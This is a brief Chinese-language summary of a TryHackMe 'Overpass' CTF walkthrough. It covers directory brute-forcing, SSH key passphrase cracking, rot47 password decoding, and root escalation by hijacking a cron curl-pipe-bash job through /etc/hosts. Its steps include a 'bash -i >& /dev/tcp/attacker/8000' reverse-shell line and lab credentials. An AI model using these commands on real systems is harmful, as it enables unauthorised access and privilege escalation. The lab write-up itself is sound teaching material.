---
title: "TryHackMe Overpass writeup"
category: web
tags: ["TryHackMe", "web", "tryhackme", "gobuster", "rsa-ssh-passphrase", "rot47-cipher"]
signals: ["TryHackMe 2022", "tryhackme", "gobuster", "rsa-ssh-passphrase", "rot47-cipher", "password-manager-overpass", "hosts-file-hijack", "curl-pipe-bash", "web_unknown", "TryHackMe", "Overpass", "ssh2john", "rot47", "etc"]
difficulty: medium
source: "https://www.ctfiot.com/25437.html"
tools: ["curl", "gobuster", "netcat"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# TryHackMe Overpass writeup

> 赛事：TryHackMe 2022 | 方向：web | 难度：medium | 工具：curl、gobuster、netcat

## 一句话总结

TryHackMe Overpass：gobuster + ssh2john 爆破 + rot47 密码 + /etc/hosts 劫持 cron 反弹 root。

## 攻击链

1. gobuster dir /admin /downloads 找后台
2. /api/login 简单用户名密码 (无认证)
3. 下载 /downloads/src/buildscript.sh (回显)
4. RSA 私钥 ssh2john + john 爆破 james13
5. ssh james@10.10.17.22 登录
6. cat .overpass 加密密码
7. overpass 工具 rot47 解密 → System saydrawnlyingpicture
8. cat /etc/crontab: * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
9. /etc/hosts 写入 IP overpass.thm (crontab 域名劫持)
10. mkdir downloads/src/buildscript.sh 内容: bash -i >& /dev/tcp/attacker/8000
11. HTTP server 80 + nc -lvnp 8000 反弹 root shell

## 关键 payload

```
/etc/hosts hijack overpass.thm
```

## 经验教训

Linux cron 服务 crontab 引用域名时，本地 /etc/hosts 优先级最高 → cron 域名劫持是真实持久化攻击面。

## 标签

tryhackme、gobuster、rsa-ssh-passphrase、rot47-cipher、password-manager-overpass、hosts-file-hijack、curl-pipe-bash

## 参考来源

- https://www.ctfiot.com/25437.html
- 原文件：TryHackMe_Overpass_writeup.full.md
